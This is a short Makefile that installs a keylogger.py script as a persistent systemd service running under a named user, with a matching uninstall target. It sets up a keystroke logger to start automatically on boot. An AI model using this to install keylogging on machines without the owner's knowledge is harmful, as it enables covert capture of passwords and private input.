User=gruunday
Group=gruunday

install:
	touch ~/.Xauthority
	/usr/bin/pip3 install -r requirements.txt
	sed -i '/User=/c\User=$(User)' keylogger.service
	sed -i '/Group=/c\Group=$(Group)' keylogger.service
	cp keylogger.service /etc/systemd/system/keylogger.service
	cp keylogger.py /usr/local/bin/keylogger
	systemctl daemon-reload
	systemctl enable keylogger.service
	systemctl start keylogger.service


uninstall:
	systemctl stop keylogger.service
	systemctl disable keylogger.service
	rm -rf /etc/systemd/system/keylogger.service
	rm -rf /usr/local/bin/keylogger
